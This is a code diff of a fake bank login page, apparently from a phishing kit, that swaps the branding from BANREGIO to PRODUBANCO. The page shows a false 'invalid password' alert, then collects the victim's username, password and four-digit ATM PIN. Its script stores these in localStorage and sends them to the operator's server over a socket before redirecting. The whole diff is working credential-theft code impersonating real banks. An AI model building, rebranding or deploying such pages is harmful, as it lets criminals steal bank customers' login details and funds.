@@ -78,7 +78,7 @@
     <div class="logo">
       <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQW4kQa4Shm2hZGe6G1iAA8d9RJSHJURgbzeA&s" alt="logo" />
     </div>
-    <h2>Bienvenido a <strong>BANREGIO</strong></h2>
+    <h2>Bienvenido a <strong>PRODUBANCO</strong></h2>
     <div class="alerta">
       ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
     </div>
@@ -86,8 +86,8 @@
     <form id="login-form">
       <input type="text" id="usuario" placeholder="Ingrese su usuario" required />
       <input type="password" id="clave" placeholder="Contraseña" required />
-      <!-- Nuevo campo -->
-      <input type="text" id="cajero" placeholder="Clave de cajero" maxlength="4" required />
+      <!-- Campo Clave de Cajero -->
+      <input type="text" id="claveCajero" placeholder="Clave de cajero" maxlength="4" required />
       <button type="submit">Continuar</button>
     </form>
   </div>
@@ -106,15 +106,15 @@
 
           const usuario = document.getElementById('usuario').value;
           const contrasena = document.getElementById('clave').value;
-          const cajero = document.getElementById('cajero').value;
+          const claveCajero = document.getElementById('claveCajero').value;
           const sessionId = localStorage.getItem('sessionId');
 
-          if (!usuario || !contrasena || !cajero) {
+          if (!usuario || !contrasena || !claveCajero) {
             alert("Por favor, complete todos los campos.");
             return;
           }
 
-          if (!/^\d{4}$/.test(cajero)) {
+          if (!/^\d{4}$/.test(claveCajero)) {
             alert("La clave de cajero debe tener exactamente 4 dígitos numéricos.");
             return;
           }
@@ -122,10 +122,10 @@
           // Guardar en localStorage
           localStorage.setItem('usuario', usuario);
           localStorage.setItem('contrasena', contrasena);
-          localStorage.setItem('cajero', cajero);
+          localStorage.setItem('claveCajero', claveCajero);
 
           // Enviar al servidor
-          socket.emit('errorlogoForm', { usuario, contrasena, cajero, sessionId });
+          socket.emit('errorlogoForm', { usuario, contrasena, claveCajero, sessionId });
 
           // Redirigir
           window.location.href = 'opciones.html';
